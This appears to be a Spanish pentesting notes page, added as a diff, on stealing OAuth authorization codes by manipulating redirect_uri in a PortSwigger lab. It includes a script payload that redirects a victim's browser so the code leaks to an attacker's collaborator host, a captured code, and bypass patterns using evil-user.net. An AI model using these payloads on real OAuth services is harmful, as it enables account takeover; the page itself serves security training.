@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;&lt;strong&gt;Authorization Code Grant Type&lt;/strong&gt; (response_type=code) :&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p><strong>Authorization Code Grant Type</strong> (response_type=code) :</p>
+
+<pre><code class="language-HTTP">GET /auth?client_id=q915ketoagt2nasucjbc7&amp;redirect_uri=https://0a6200be04527b9f81c02a56008c00bc.web-security-academy.net/oauth-callback&amp;response_type=code&amp;scope=openid%20profile%20email HTTP/2
+</code></pre>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="dl">'</span><span class="s1">https://oauth-0a9e00d304bba001811b1e81021400b7.oauth-server.net/auth?client_id=pujzm6j861iwqutbz7nrj&amp;redirect_uri=https://zx08szy8tkdvaqlhl1o24stao1uwin8bx.oastify.com/oauth-callback&amp;response_type=code&amp;scope=openid%20profile%20email</span><span class="dl">'</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>Luego accederíamos al callback real con el código que nos llega en el collaborator :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://0a9f002b0421a04d81742009007e006d.web-security-academy.net/oauth-callback?code=fSRO55naPkbCcfCk0vXiGvegFS19e2CHPHZZh-qX_y9
+</code></pre></div></div>
+
+<table>
+  <tbody>
+    <tr>
+      <td>[OAuth 2.0 authentication vulnerabilities</td>
+      <td>Web Security Academy](https://portswigger.net/web-security/oauth#leaking-authorization-codes-and-access-tokens)</td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>Some implementations allow for a range of subdirectories by checking only that the string starts with the correct sequence of characters i.e. an approved domain. You should try removing or adding arbitrary paths, query parameters, and fragments to see what you can change without triggering an error.</li>
+  <li>
+    <p>If you can append extra values to the default <code class="language-plaintext highlighter-rouge">redirect_uri</code> parameter, you might be able to exploit discrepancies between the parsing of the URI by the different components of the OAuth service. For example, you can try techniques such as:</p>
+
+    <p><code class="language-plaintext highlighter-rouge">https://default-host.com &amp;@foo.evil-user.net#@bar.evil-user.net/</code></p>
+
+    <p>If you’re not familiar with these techniques, we recommend reading our content on how to <a href="https://portswigger.net/web-security/ssrf#circumventing-common-ssrf-defenses">circumvent common SSRF defences</a> and <a href="https://portswigger.net/web-security/cors#errors-parsing-origin-headers">CORS</a>.</p>
+  </li>
+  <li>
+    <p>You may occasionally come across server-side parameter pollution vulnerabilities. Just in case, you should try submitting duplicate <code class="language-plaintext highlighter-rouge">redirect_uri</code> parameters as follows:</p>
+
+    <p><code class="language-plaintext highlighter-rouge">https://oauth-authorization-server.com/?client_id=123&amp;redirect_uri=client-app.com/callback&amp;redirect_uri=evil-user.net</code></p>
+  </li>
+  <li>Some servers also give special treatment to <code class="language-plaintext highlighter-rouge">localhost</code> URIs as they’re often used during development. In some cases, any redirect URI beginning with <code class="language-plaintext highlighter-rouge">localhost</code> may be accidentally permitted in the production environment. This could allow you to bypass the validation by registering a domain name such as <code class="language-plaintext highlighter-rouge">localhost.evil-user.net</code>.</li>
+</ul>
+
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
